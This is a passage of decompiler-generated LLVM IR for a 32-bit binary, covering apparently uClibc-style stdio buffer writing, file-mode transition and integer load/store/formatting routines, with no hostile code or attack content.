  store i32 %v3_80551a9, i32* @edx, align 4
  %v1_80551ac = add i32 %arg3, 12
  %v2_80551ac = inttoptr i32 %v1_80551ac to i32*
  %v3_80551ac = load i32, i32* %v2_80551ac, align 4
  %v1_80551af = icmp eq i1 %v13_80551a5, false
  %v2_80551cf = sub i32 %v3_80551ac, %v3_80551a9
  store i32 %v2_80551cf, i32* %eax.global-to-local, align 4
  br i1 %v1_80551af, label %dec_label_pc_80551cf, label %dec_label_pc_80551b1

dec_label_pc_80551b1:                             ; preds = %dec_label_pc_80551a5
  %tmp22 = icmp ult i32 %v2_80551cf, %arg2
  br i1 %tmp22, label %dec_label_pc_80551b9, label %dec_label_pc_80551bb

dec_label_pc_80551b9:                             ; preds = %dec_label_pc_80551b1
  br label %dec_label_pc_80551bb

dec_label_pc_80551bb:                             ; preds = %dec_label_pc_80551b1, %dec_label_pc_80551b9
  %storemerge = phi i32 [ %v2_80551cf, %dec_label_pc_80551b9 ], [ %arg2, %dec_label_pc_80551b1 ]
  %v0_80551bc = phi i32 [ %v2_80551cf, %dec_label_pc_80551b9 ], [ %arg2, %dec_label_pc_80551b1 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_80551bf = inttoptr i32 %v3_80551a9 to i16*
  %v4_80551bf = call i32 @memcpy(i16* %v3_80551bf, i32 %v0_80551bc, i32 %v2_80551cf)
  store i32 %v4_80551bf, i32* %eax.global-to-local, align 4
  %v0_80551c4 = load i32, i32* @ebx, align 4
  %v1_80551c4 = add i32 %v0_80551c4, 16
  %v2_80551c4 = inttoptr i32 %v1_80551c4 to i32*
  %v3_80551c4 = load i32, i32* %v2_80551c4, align 4
  %v4_80551c4 = load i32, i32* @esi, align 4
  %v5_80551c4 = add i32 %v4_80551c4, %v3_80551c4
  store i32 %v5_80551c4, i32* %v2_80551c4, align 4
  br label %dec_label_pc_805526e

dec_label_pc_80551cf:                             ; preds = %dec_label_pc_80551a5
  %v6_80551d3 = icmp ult i32 %v2_80551cf, %arg2
  br i1 %v6_80551d3, label %dec_label_pc_805523d, label %dec_label_pc_80551d5

dec_label_pc_80551d5:                             ; preds = %dec_label_pc_80551cf
  %v0_80551d5 = load i32, i32* @ecx, align 4
  %v3_80551d9 = inttoptr i32 %v3_80551a9 to i16*
  %v4_80551d9 = call i32 @memcpy(i16* %v3_80551d9, i32 %arg2, i32 %v0_80551d5)
  store i32 %v4_80551d9, i32* %eax.global-to-local, align 4
  %v0_80551de = load i32, i32* @ebx, align 4
  %v1_80551de = add i32 %v0_80551de, 16
  %v2_80551de = inttoptr i32 %v1_80551de to i32*
  %v3_80551de = load i32, i32* %v2_80551de, align 4
  %v4_80551de = load i32, i32* @edi, align 4
  %v5_80551de = add i32 %v4_80551de, %v3_80551de
  store i32 %v5_80551de, i32* %v2_80551de, align 4
  %v0_80551e4 = load i32, i32* @ebx, align 4
  %v1_80551e4 = add i32 %v0_80551e4, 1
  %v2_80551e4 = inttoptr i32 %v1_80551e4 to i8*
  %v3_80551e4 = load i8, i8* %v2_80551e4, align 1
  %v4_80551e4 = urem i8 %v3_80551e4, 2
  %v5_80551e4 = icmp eq i8 %v4_80551e4, 0
  br i1 %v5_80551e4, label %dec_label_pc_805526e, label %dec_label_pc_80551ee

dec_label_pc_80551ee:                             ; preds = %dec_label_pc_80551d5
  %v0_80551ee = load i32, i32* @edx, align 4
  %v0_80551ef = load i32, i32* @edi, align 4
  %v4_80551f3 = call i32 @memrchr(i8 10, i32 %v0_80551ef, i32 %v0_80551ee)
  store i32 %v4_80551f3, i32* %eax.global-to-local, align 4
  %v1_80551fb = icmp eq i32 %v4_80551f3, 0
  br i1 %v1_80551fb, label %dec_label_pc_805526e, label %dec_label_pc_80551ff

dec_label_pc_80551ff:                             ; preds = %dec_label_pc_80551ee
  %v0_8055202 = load i32, i32* @ebx, align 4
  %v1_8055203 = call i32 @__stdio_wcommit(i32 %v0_8055202)
  store i32 %v1_8055203, i32* %eax.global-to-local, align 4
  %v1_805520b = icmp eq i32 %v1_8055203, 0
  br i1 %v1_805520b, label %dec_label_pc_805526e, label %dec_label_pc_805520f

dec_label_pc_805520f:                             ; preds = %dec_label_pc_80551ff
  %v0_805520f = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_805520f, %v1_8055203
  br i1 %tmp23, label %dec_label_pc_8055215, label %dec_label_pc_8055217

dec_label_pc_8055215:                             ; preds = %dec_label_pc_805520f
  br label %dec_label_pc_8055217

dec_label_pc_8055217:                             ; preds = %dec_label_pc_805520f, %dec_label_pc_8055215
  %storemerge24 = phi i32 [ %v1_8055203, %dec_label_pc_8055215 ], [ %v0_805520f, %dec_label_pc_805520f ]
  %v0_805521e = phi i32 [ %v1_8055203, %dec_label_pc_8055215 ], [ %v0_805520f, %dec_label_pc_805520f ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8055219 = sub i32 %v0_805520f, %v0_805521e
  store i32 %v2_8055219, i32* %eax.global-to-local, align 4
  %v0_805521b = load i32, i32* @ebp, align 4
  %v2_805521b = add i32 %v0_805521b, %v2_8055219
  store i32 %v2_805521b, i32* %ebp.global-to-local, align 4
  %v4_8055222 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_805521e, i32 %v2_8055219)
  store i32 %v4_8055222, i32* %eax.global-to-local, align 4
  store i32 %v4_8055222, i32* @edx, align 4
  %v1_805522c = icmp eq i32 %v4_8055222, 0
  br i1 %v1_805522c, label %dec_label_pc_805526e, label %dec_label_pc_8055230

dec_label_pc_8055230:                             ; preds = %dec_label_pc_8055217
  %v0_8055230 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055230 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055230 = sub i32 %v0_8055230, %v4_8055222
  %v2_8055234 = add i32 %v2_8055230, %v1_8055230
  store i32 %v2_8055234, i32* %eax.global-to-local, align 4
  %v0_8055236 = load i32, i32* @ebx, align 4
  %v1_8055236 = add i32 %v0_8055236, 16
  %v2_8055236 = inttoptr i32 %v1_8055236 to i32*
  %v3_8055236 = load i32, i32* %v2_8055236, align 4
  %v5_8055236 = sub i32 %v3_8055236, %v2_8055234
  store i32 %v5_8055236, i32* %v2_8055236, align 4
  %v0_8055239 = load i32, i32* @edi, align 4
  %v1_8055239 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055239 = sub i32 %v0_8055239, %v1_8055239
  store i32 %v2_8055239, i32* @edi, align 4
  br label %dec_label_pc_805526e

dec_label_pc_805523d:                             ; preds = %dec_label_pc_80551cf
  %v2_805523d = add i32 %arg3, 8
  %v3_805523d = inttoptr i32 %v2_805523d to i32*
  %v4_805523d = load i32, i32* %v3_805523d, align 4
  %v15_805523d = icmp eq i32 %v3_80551a9, %v4_805523d
  br i1 %v15_805523d, label %dec_label_pc_8055256, label %dec_label_pc_8055242

dec_label_pc_8055242:                             ; preds = %dec_label_pc_805523d
  %v1_8055246 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8055246, i32* %eax.global-to-local, align 4
  %v1_805524e = icmp eq i32 %v1_8055246, 0
  br i1 %v1_805524e, label %dec_label_pc_8055242.dec_label_pc_8055256_crit_edge, label %dec_label_pc_8055252

dec_label_pc_8055242.dec_label_pc_8055256_crit_edge: ; preds = %dec_label_pc_8055242
  %v0_8055256.pre = load i32, i32* @edi, align 4
  %v0_805525e.pre = load i32, i32* @ebx, align 4
  %v2_8055265.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8055256

dec_label_pc_8055252:                             ; preds = %dec_label_pc_8055242
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805526e

dec_label_pc_8055256:                             ; preds = %dec_label_pc_8055242.dec_label_pc_8055256_crit_edge, %dec_label_pc_805523d, %entry
  %v2_8055265 = phi i32 [ %v2_8055265.pre, %dec_label_pc_8055242.dec_label_pc_8055256_crit_edge ], [ %v0_805518b, %dec_label_pc_805523d ], [ %v0_805518b, %entry ]
  %v0_805525e = phi i32 [ %v0_805525e.pre, %dec_label_pc_8055242.dec_label_pc_8055256_crit_edge ], [ %arg3, %dec_label_pc_805523d ], [ %arg3, %entry ]
  %v0_8055256 = phi i32 [ %v0_8055256.pre, %dec_label_pc_8055242.dec_label_pc_8055256_crit_edge ], [ %arg2, %dec_label_pc_805523d ], [ %arg2, %entry ]
  store i32 %v2_8055265, i32* @ebx, align 4
  store i32 %v0_8055189, i32* @edi, align 4
  %v4_8055269 = inttoptr i32 %v0_805525e to i16*
  %v5_8055269 = call i32 @__stdio_WRITE(i16* %v4_8055269, i32 %v0_8055256, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055269, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805526e

dec_label_pc_805526e:                             ; preds = %dec_label_pc_8055217, %dec_label_pc_80551ff, %dec_label_pc_80551ee, %dec_label_pc_80551d5, %dec_label_pc_8055252, %dec_label_pc_8055230, %dec_label_pc_80551bb, %dec_label_pc_8055256
  %v0_8055271 = load i32, i32* @edi, align 4
  store i32 %v0_8055271, i32* %eax.global-to-local, align 4
  %v2_8055273 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055273, i32* @ebx, align 4
  store i32 %v0_805518a, i32* @esi, align 4
  store i32 %v0_8055189, i32* @edi, align 4
  store i32 %v0_8055188, i32* @ebp, align 4
  ret i32 %v0_8055271

; uselistorder directives
  uselistorder i32 %v2_8055234, { 1, 0 }
  uselistorder i32 %v4_8055222, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055219, { 1, 0, 2 }
  uselistorder i32 %v0_805520f, { 3, 0, 1, 2 }
  uselistorder i32 %v2_80551cf, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_8055189, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_805526e, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8055217, { 1, 0 }
  uselistorder label %dec_label_pc_80551bb, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055278 = load i32, i32* @ebx, align 4
  %v4_805527c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805527c, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8055284 = bitcast i16* %arg1 to i32*
  %v2_8055284 = load i32, i32* %v1_8055284, align 4
  store i32 %v2_8055284, i32* %eax.global-to-local, align 4
  %v1_8055286 = urem i32 %v2_8055284, 65536
  store i32 %v1_8055286, i32* %edx.global-to-local, align 4
  %v2_8055289 = and i32 %v1_8055286, %arg2
  %v3_8055289 = icmp eq i32 %v2_8055289, 0
  %v1_805528b = icmp eq i1 %v3_8055289, false
  br i1 %v1_805528b, label %dec_label_pc_805529a, label %dec_label_pc_805528d

dec_label_pc_805528d:                             ; preds = %entry
  %v1_805528d = and i32 %v2_8055284, 2176
  %v2_805528d = icmp eq i32 %v1_805528d, 0
  store i32 %v1_805528d, i32* %edx.global-to-local, align 4
  %v1_8055293 = icmp eq i1 %v2_805528d, false
  br i1 %v1_8055293, label %dec_label_pc_80552a2, label %dec_label_pc_8055295

dec_label_pc_8055295:                             ; preds = %dec_label_pc_805528d
  %v2_8055295 = or i32 %v2_8055284, %arg2
  store i32 %v2_8055295, i32* %eax.global-to-local, align 4
  %v1_8055297 = trunc i32 %v2_8055295 to i16
  store i16 %v1_8055297, i16* %arg1, align 2
  %v0_805529a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805529a

dec_label_pc_805529a:                             ; preds = %entry, %dec_label_pc_8055295
  %v0_80552df = phi i32 [ %v4_805527c, %entry ], [ %v0_805529a.pre, %dec_label_pc_8055295 ]
  %v1_805529a = inttoptr i32 %v0_80552df to i16*
  %v2_805529a = load i16, i16* %v1_805529a, align 2
  %v3_805529a = zext i16 %v2_805529a to i32
  store i32 %v3_805529a, i32* %edx.global-to-local, align 4
  %v2_805529d = and i16 %v2_805529a, 32
  %v3_805529d = icmp eq i16 %v2_805529d, 0
  br i1 %v3_805529d, label %dec_label_pc_80552b6, label %dec_label_pc_80552a2

dec_label_pc_80552a2:                             ; preds = %dec_label_pc_805529a, %dec_label_pc_805528d
  %v1_80552a2 = call i32 @__errno_location(i32 %v0_8055278)
  store i32 %v1_80552a2, i32* %eax.global-to-local, align 4
  %v1_80552a7 = inttoptr i32 %v1_80552a2 to i32*
  store i32 9, i32* %v1_80552a7, align 4
  br label %dec_label_pc_80552ad

dec_label_pc_80552ad:                             ; preds = %dec_label_pc_80552cd, %dec_label_pc_80552a2
  %v0_80552ad = load i32, i32* @ebx, align 4
  %v1_80552ad = inttoptr i32 %v0_80552ad to i16*
  %v2_80552ad = load i16, i16* %v1_80552ad, align 2
  %v3_80552ad = or i16 %v2_80552ad, 8
  store i16 %v3_80552ad, i16* %v1_80552ad, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055310

dec_label_pc_80552b6:                             ; preds = %dec_label_pc_805529a
  %v2_80552b6 = urem i16 %v2_805529a, 4
  %v3_80552b6 = icmp eq i16 %v2_80552b6, 0
  br i1 %v3_80552b6, label %dec_label_pc_80552fc, label %dec_label_pc_80552bb

dec_label_pc_80552bb:                             ; preds = %dec_label_pc_80552b6
  %v2_80552bb = and i32 %v3_805529a, 4
  %v3_80552bb = icmp eq i32 %v2_80552bb, 0
  %v1_80552be = icmp eq i1 %v3_80552bb, false
  br i1 %v1_80552be, label %dec_label_pc_80552ec, label %dec_label_pc_80552c0

dec_label_pc_80552c0:                             ; preds = %dec_label_pc_80552bb
  %v1_80552c0 = add i32 %v0_80552df, 20
  %v2_80552c0 = inttoptr i32 %v1_80552c0 to i32*
  %v3_80552c0 = load i32, i32* %v2_80552c0, align 4
  store i32 %v3_80552c0, i32* %eax.global-to-local, align 4
  %v2_80552c3 = add i32 %v0_80552df, 16
  %v3_80552c3 = inttoptr i32 %v2_80552c3 to i32*
  %v4_80552c3 = load i32, i32* %v3_80552c3, align 4
  %v15_80552c3 = icmp eq i32 %v3_80552c0, %v4_80552c3
  %v1_80552c6 = icmp eq i1 %v15_80552c3, false
  br i1 %v1_80552c6, label %dec_label_pc_80552cd, label %dec_label_pc_80552c8

dec_label_pc_80552c8:                             ; preds = %dec_label_pc_80552c0
  %v2_80552c8 = and i32 %v3_805529a, 2
  %v3_80552c8 = icmp eq i32 %v2_80552c8, 0
  br i1 %v3_80552c8, label %dec_label_pc_80552ec, label %dec_label_pc_80552cd

dec_label_pc_80552cd:                             ; preds = %dec_label_pc_80552c8, %dec_label_pc_80552c0
  %v1_80552cd = and i32 %v3_805529a, 1024
  store i32 %v1_80552cd, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_80552cd, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_80552e0 = call i32 @__GI_fseek(i32 %v0_80552df, i32 0, i32 %tmp18, i32 %v1_80552cd)
  store i32 %v5_80552e0, i32* %eax.global-to-local, align 4
  %v1_80552e8 = icmp eq i32 %v5_80552e0, 0
  %v1_80552ea = icmp eq i1 %v1_80552e8, false
  br i1 %v1_80552ea, label %dec_label_pc_80552ad, label %dec_label_pc_80552cd.dec_label_pc_80552ec_crit_edge

dec_label_pc_80552cd.dec_label_pc_80552ec_crit_edge: ; preds = %dec_label_pc_80552cd
  %v0_80552ec.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80552ec

dec_label_pc_80552ec:                             ; preds = %dec_label_pc_80552cd.dec_label_pc_80552ec_crit_edge, %dec_label_pc_80552c8, %dec_label_pc_80552bb
  %v10_80552ec = phi i32 [ %v0_80552ec.pre, %dec_label_pc_80552cd.dec_label_pc_80552ec_crit_edge ], [ %v0_80552df, %dec_label_pc_80552c8 ], [ %v0_80552df, %dec_label_pc_80552bb ]
  %v1_80552ec = inttoptr i32 %v10_80552ec to i16*
  %v2_80552ec = load i16, i16* %v1_80552ec, align 2
  %v3_80552ec = and i16 %v2_80552ec, -4
  store i16 %v3_80552ec, i16* %v1_80552ec, align 2
  %v0_80552f0 = load i32, i32* @ebx, align 4
  %v1_80552f0 = add i32 %v0_80552f0, 8
  %v2_80552f0 = inttoptr i32 %v1_80552f0 to i32*
  %v3_80552f0 = load i32, i32* %v2_80552f0, align 4
  store i32 %v3_80552f0, i32* %eax.global-to-local, align 4
  %v2_80552f3 = add i32 %v0_80552f0, 24
  %v3_80552f3 = inttoptr i32 %v2_80552f3 to i32*
  store i32 %v3_80552f0, i32* %v3_80552f3, align 4
  %v0_80552f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80552f6 = load i32, i32* @ebx, align 4
  %v2_80552f6 = add i32 %v1_80552f6, 16
  %v3_80552f6 = inttoptr i32 %v2_80552f6 to i32*
  store i32 %v0_80552f6, i32* %v3_80552f6, align 4
  %v0_80552f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80552f9 = load i32, i32* @ebx, align 4
  %v2_80552f9 = add i32 %v1_80552f9, 20
  %v3_80552f9 = inttoptr i32 %v2_80552f9 to i32*
  store i32 %v0_80552f9, i32* %v3_80552f9, align 4
  %v0_80552fc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80552fc

dec_label_pc_80552fc:                             ; preds = %dec_label_pc_80552b6, %dec_label_pc_80552ec
  %v9_80552fc = phi i32 [ %v0_80552df, %dec_label_pc_80552b6 ], [ %v0_80552fc.pre, %dec_label_pc_80552ec ]
  %v1_80552fc = inttoptr i32 %v9_80552fc to i16*
  %v2_80552fc = load i16, i16* %v1_80552fc, align 2
  %v3_80552fc = or i16 %v2_80552fc, 64
  store i16 %v3_80552fc, i16* %v1_80552fc, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8055302 = load i32, i32* @ebx, align 4
  %v1_8055302 = inttoptr i32 %v0_8055302 to i16*
  %v2_8055302 = load i16, i16* %v1_8055302, align 2
  %v3_8055302 = zext i16 %v2_8055302 to i32
  store i32 %v3_8055302, i32* %eax.global-to-local, align 4
  %v3_8055305 = and i16 %v2_8055302, 2816
  %v4_8055305 = icmp eq i16 %v3_8055305, 0
  %v1_8055308 = icmp eq i1 %v4_8055305, false
  br i1 %v1_8055308, label %dec_label_pc_8055310, label %dec_label_pc_805530a

dec_label_pc_805530a:                             ; preds = %dec_label_pc_80552fc
  %v1_805530a = add i32 %v0_8055302, 12
  %v2_805530a = inttoptr i32 %v1_805530a to i32*
  %v3_805530a = load i32, i32* %v2_805530a, align 4
  store i32 %v3_805530a, i32* %eax.global-to-local, align 4
  %v2_805530d = add i32 %v0_8055302, 28
  %v3_805530d = inttoptr i32 %v2_805530d to i32*
  store i32 %v3_805530a, i32* %v3_805530d, align 4
  %v0_8055310.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8055310

dec_label_pc_8055310:                             ; preds = %dec_label_pc_80552fc, %dec_label_pc_80552ad, %dec_label_pc_805530a
  %v0_8055310 = phi i32 [ 0, %dec_label_pc_80552fc ], [ -1, %dec_label_pc_80552ad ], [ %v0_8055310.pre, %dec_label_pc_805530a ]
  store i32 %v0_8055310, i32* %eax.global-to-local, align 4
  %v2_8055312 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055312, i32* @edx, align 4
  store i32 %v0_8055278, i32* @ebx, align 4
  ret i32 %v0_8055310

; uselistorder directives
  uselistorder i32 %v0_8055310, { 1, 0 }
  uselistorder i32 %v0_8055302, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_80552cd, { 1, 0, 2 }
  uselistorder i32 %v0_80552df, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8055286, { 1, 0 }
  uselistorder i32 %v2_8055284, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8055278, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055310, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80552fc, { 1, 0 }
  uselistorder label %dec_label_pc_805529a, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8055320 = icmp slt i32 %tmp, 0
  %v3_8055349 = and i32 %tmp5, 2048
  %v4_8055349 = icmp eq i32 %v3_8055349, 0
  br i1 %v5_8055320, label %dec_label_pc_8055349, label %dec_label_pc_8055327

dec_label_pc_8055327:                             ; preds = %entry
  %v1_805532a = icmp eq i1 %v4_8055349, false
  br i1 %v1_805532a, label %dec_label_pc_805534e, label %dec_label_pc_805532c

dec_label_pc_805532c:                             ; preds = %dec_label_pc_8055327
  %v1_805532c = inttoptr i32 %tmp4 to i32*
  %v2_805532c = load i32, i32* %v1_805532c, align 4
  %v6_805532e = icmp eq i32 %tmp5, 256
  %v1_8055334 = icmp eq i1 %v6_805532e, false
  br i1 %v1_8055334, label %dec_label_pc_805533b, label %dec_label_pc_8055336

dec_label_pc_8055336:                             ; preds = %dec_label_pc_805532c
  %v1_8055336 = urem i32 %v2_805532c, 256
  br label %dec_label_pc_8055346

dec_label_pc_805533b:                             ; preds = %dec_label_pc_805532c
  %v6_805533b = icmp eq i32 %tmp5, 512
  %v1_8055341 = icmp eq i1 %v6_805533b, false
  br i1 %v1_8055341, label %dec_label_pc_8055346, label %dec_label_pc_8055343

dec_label_pc_8055343:                             ; preds = %dec_label_pc_805533b
  %v1_8055343 = urem i32 %v2_805532c, 65536
  br label %dec_label_pc_8055346

dec_label_pc_8055346:                             ; preds = %dec_label_pc_805533b, %dec_label_pc_8055336, %dec_label_pc_8055343
  %v0_8055348 = phi i32 [ %v2_805532c, %dec_label_pc_805533b ], [ %v1_8055336, %dec_label_pc_8055336 ], [ %v1_8055343, %dec_label_pc_8055343 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8055348

dec_label_pc_8055349:                             ; preds = %entry
  br i1 %v4_8055349, label %dec_label_pc_8055354, label %dec_label_pc_805534e

dec_label_pc_805534e:                             ; preds = %dec_label_pc_8055349, %dec_label_pc_8055327
  %v1_805534e = add i32 %tmp4, 4
  %v2_805534e = inttoptr i32 %v1_805534e to i32*
  %v3_805534e = load i32, i32* %v2_805534e, align 4
  store i32 %v3_805534e, i32* @edx, align 4
  %v1_8055351 = inttoptr i32 %tmp4 to i32*
  %v2_8055351 = load i32, i32* %v1_8055351, align 4
  ret i32 %v2_8055351

dec_label_pc_8055354:                             ; preds = %dec_label_pc_8055349
  %v1_8055354 = inttoptr i32 %tmp4 to i32*
  %v2_8055354 = load i32, i32* %v1_8055354, align 4
  %v6_8055356 = icmp eq i32 %tmp5, 256
  %v1_805535c = icmp eq i1 %v6_8055356, false
  br i1 %v1_805535c, label %dec_label_pc_8055363, label %dec_label_pc_805535e

dec_label_pc_805535e:                             ; preds = %dec_label_pc_8055354
  %v1_805535e = mul i32 %v2_8055354, 16777216
  %v2_805535e = sdiv i32 %v1_805535e, 16777216
  br label %dec_label_pc_805536c

dec_label_pc_8055363:                             ; preds = %dec_label_pc_8055354
  %v6_8055363 = icmp eq i32 %tmp5, 512
  %v1_8055369 = icmp eq i1 %v6_8055363, false
  br i1 %v1_8055369, label %dec_label_pc_805536c, label %dec_label_pc_805536b

dec_label_pc_805536b:                             ; preds = %dec_label_pc_8055363
  %v1_805536b = mul i32 %v2_8055354, 65536
  %v2_805536b = sdiv i32 %v1_805536b, 65536
  br label %dec_label_pc_805536c

dec_label_pc_805536c:                             ; preds = %dec_label_pc_8055363, %dec_label_pc_805535e, %dec_label_pc_805536b
  %v0_805536c = phi i32 [ %v2_8055354, %dec_label_pc_8055363 ], [ %v2_805535e, %dec_label_pc_805535e ], [ %v2_805536b, %dec_label_pc_805536b ]
  %v1_805536c = ashr i32 %v0_805536c, 31
  store i32 %v1_805536c, i32* @edx, align 4
  ret i32 %v0_805536c

; uselistorder directives
  uselistorder i32 %v0_805536c, { 1, 0 }
  uselistorder i32 %v2_8055354, { 2, 0, 1 }
  uselistorder i32 %v2_805532c, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805536c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055346, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_5()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055370 = load i32, i32* @ebx, align 4
  store i32 %v0_8055370, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8055375 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8055375, i32* %ebx.global-to-local, align 4
  %v4_8055379 = trunc i32 %tmp4 to i16
  %v6_8055381 = icmp eq i32 %tmp6, 256
  %v1_8055387 = icmp eq i1 %v6_8055381, false
  br i1 %v1_8055387, label %dec_label_pc_805538d, label %dec_label_pc_8055389

dec_label_pc_8055389:                             ; preds = %entry
  %v2_8055389 = trunc i32 %tmp4 to i8
  %v4_8055389 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8055389, i8* %v4_8055389, align 1
  br label %dec_label_pc_80553ab

dec_label_pc_805538d:                             ; preds = %entry
  %v6_805538d = icmp eq i32 %tmp6, 2048
  %v1_8055393 = icmp eq i1 %v6_805538d, false
  br i1 %v1_8055393, label %dec_label_pc_805539c, label %dec_label_pc_8055395

dec_label_pc_8055395:                             ; preds = %dec_label_pc_805538d
  %sext2 = mul i32 %tmp4, 65536
  %v1_8055395 = sdiv i32 %sext2, 65536
  %v3_8055395 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055395, i32* %v3_8055395, align 4
  %v0_8055397 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055397 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055397 = add i32 %v1_8055397, 4
  %v3_8055397 = inttoptr i32 %v2_8055397 to i32*
  store i32 %v0_8055397, i32* %v3_8055397, align 4
  br label %dec_label_pc_80553ab

dec_label_pc_805539c:                             ; preds = %dec_label_pc_805538d
  %v6_805539c = icmp eq i32 %tmp6, 512
  %v1_80553a2 = icmp eq i1 %v6_805539c, false
  br i1 %v1_80553a2, label %dec_label_pc_80553a9, label %dec_label_pc_80553a4

dec_label_pc_80553a4:                             ; preds = %dec_label_pc_805539c
  store i16 %v4_8055379, i16* %tmp5, align 2
  br label %dec_label_pc_80553ab

dec_label_pc_80553a9:                             ; preds = %dec_label_pc_805539c
  %sext3 = mul i32 %tmp4, 65536
  %v1_80553a9 = sdiv i32 %sext3, 65536
  %v3_80553a9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80553a9, i32* %v3_80553a9, align 4
  br label %dec_label_pc_80553ab

dec_label_pc_80553ab:                             ; preds = %dec_label_pc_80553a4, %dec_label_pc_8055395, %dec_label_pc_8055389, %dec_label_pc_80553a9
  %v2_80553ab = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80553ab, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_80553ac = sdiv i32 %sext, 65536
  ret i32 %v1_80553ac

; uselistorder directives
  uselistorder label %dec_label_pc_80553ab, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_80553bb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80553bb, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80553c7 = icmp slt i32 %arg4, 0
  %v1_80553c9 = icmp eq i1 %v2_80553c7, false
  br i1 %v1_80553c9, label %dec_label_pc_80553ea, label %dec_label_pc_80553cb

dec_label_pc_80553cb:                             ; preds = %entry
  %v1_80553cb = sub i32 0, %arg4
  store i32 %v1_80553cb, i32* %esi.global-to-local, align 4
  %v2_80553cd = icmp slt i32 %arg3, 0
  %v1_80553cf = icmp eq i1 %v2_80553cd, false
  br i1 %v1_80553cf, label %dec_label_pc_80553ea, label %dec_label_pc_80553d1

dec_label_pc_80553d1:                             ; preds = %dec_label_pc_80553cb
  %v1_80553d1 = sub i32 0, %arg2
  %v5_80553d1 = icmp ne i32 %arg2, 0
  store i32 %v1_80553d1, i32* %ecx.global-to-local, align 4
  %v2_80553d3 = zext i1 %v5_80553d1 to i32
  %v3_80553d3 = add i32 %v2_80553d3, %arg3
  %v1_80553de = sub i32 0, %v3_80553d3
  store i32 %v1_80553de, i32* %ebx.global-to-local, align 4
